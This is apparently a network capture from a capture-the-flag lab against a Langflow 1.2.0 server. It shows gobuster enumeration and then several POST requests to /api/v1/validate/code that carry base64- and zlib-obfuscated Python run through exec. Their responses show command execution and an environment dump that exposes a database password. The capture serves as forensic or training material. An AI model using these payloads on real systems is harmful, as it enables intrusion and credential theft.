@@ -1,0 +1,400 @@
+GET /api/v1/ HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+#HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+'<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+GET /api/v1/bd5018db-3d0a-4f83-9143-4b334d67cdeb HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+(HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+(<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+K,|^
+K,|^
+GET /api/v1/add HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/address HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/admin HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/advanced HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/advanced_search HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+45G@
+GET /api/v1/version HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/config HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/alert HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+GET /api/v1/admins HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: gobuster/3.8
+Accept-Encoding: gzip
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-length: 193
+content-type: application/json
+8{"feature_flags":{"mvp_components":false},"frontend_timeout":0,"auto_saving":true,"auto_saving_interval":1000,"health_check_max_retries":5,"max_file_size_upload":100,"event_delivery":"polling"}
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-length: 63
+content-type: application/json
+9{"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}
++HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+@<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+-HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+E<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+)5H@
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
+H<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+,HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:02 GMT
+server: uvicorn
+content-type: text/html; charset=utf-8
+accept-ranges: bytes
+content-length: 1111
+last-modified: Tue, 25 Feb 2025 23:13:05 GMT
+etag: "ec31704bd8672c28281901b505ba0853"
++<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+G<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+J<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+H<!doctype html>
+<html lang="en">
+  <head>
+    <base href="/" />
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./assets/favicon-new-BaG6bPWd.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"
+      rel="stylesheet"
+    />
+    <title>Langflow</title>
+    <script type="module" crossorigin src="./assets/index-hNpyfBay.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-CwAwSIfd.css">
+  </head>
+  <body id="body" class="dark" style="width: 100%; height: 100%">
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div style="width: 100vw; height: 100vh" id="root"></div>
+  </body>
+</html>
+45J@
+~bPOST /api/v1/validate/code HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: Mozilla/5.0
+Accept-Encoding: gzip, deflate
+Accept: application/json
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 222
+{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcEJgDAMAMBVJK8WxA18uoH/UEugwdaEpEHH984KOy3HV0kny5MQeajYREzgcalJJXfIW21Ub5SYGjPB26QMhnXxRr3vpwXl/ANKDhvB')).decode())): pass\n"}
+HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:07 GMT
+server: uvicorn
+content-length: 62
+content-type: application/json
+{"imports":{"errors":[]},"function":{"errors":["b'user\\n'"]}}
+~ePOST /api/v1/validate/code HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: Mozilla/5.0
+Accept-Encoding: gzip, deflate
+Accept: application/json
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 218
+~e{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcsJgDAMANBVJKcWxA08uoH3oDHQYDUlH3B837NDnKftIx4h+hZEeYZaIBbwPIcpsTvUhRrTjZoxMgrIBfPkjXtfd0uu9QfWXRoJ')).decode())): pass\n"}
+HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:07 GMT
+server: uvicorn
+content-length: 99
+content-type: application/json
+{"imports":{"errors":[]},"function":{"errors":["b'uid=1000(user) gid=0(root) groups=0(root)\\n'"]}}
+~iPOST /api/v1/validate/code HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: Mozilla/5.0
+Accept-Encoding: gzip, deflate
+Accept: application/json
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 222
+{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcEJgDAMAMBVSl4tiBv4dAP/QUOgxdqEJhHH926ezTjtH7F6k5ER26MyHTGDxaVTiM2grFSZbpRwDc/A44UlWeXet2MGl/ID83MahQ==')).decode())): pass\n"}
+HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:07 GMT
+server: uvicorn
+content-length: 951
+content-type: application/json
+{"imports":{"errors":[]},"function":{"errors":["b'TOKENIZERS_PARALLELISM=false\\nHOSTNAME=aisrv01\\nPYTHON_PIP_VERSION=24.0\\nHOME=/app/data\\nLANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPassword2025@postgres:5432/langflow\\nLANGFLOW_HOST=0.0.0.0\\nGPG_KEY=7169605F62C751356D054A26A821E680E5FA6305\\nOPENAI_API_KEY=dummy\\nASTRA_ASSISTANTS_QUIET=true\\nLANGFLOW_PORT=7860\\nLANGFLOW_CONFIG_DIR=app/langflow\\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py\\nSERVER_SOFTWARE=gunicorn/23.0.0\\nGRPC_VERBOSITY=ERROR\\nPATH=/app/.venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\nTIKTOKEN_CACHE_DIR=/app/.venv/lib/python3.12/site-packages/litellm/litellm_core_utils/tokenizers\\nLANG=C.UTF-8\\nPYTHON_VERSION=3.12.3\\nPWD=/app\\nPYTHON_GET_PIP_SHA256=dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9\\nUSER_AGENT=langflow\\n'"]}}
+~mPOST /api/v1/validate/code HTTP/1.1
+Host: ai.watchtower.htb:7860
+User-Agent: Mozilla/5.0
+Accept-Encoding: gzip, deflate
+Accept: application/json
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 322
+{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQhxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN')).decode())): pass\n"}
+HTTP/1.1 200 OK
+date: Mon, 15 Sep 2025 10:10:07 GMT
+server: uvicorn
+content-length: 55
+content-type: application/json
+{"imports":{"errors":[]},"function":{"errors":["b''"]}}
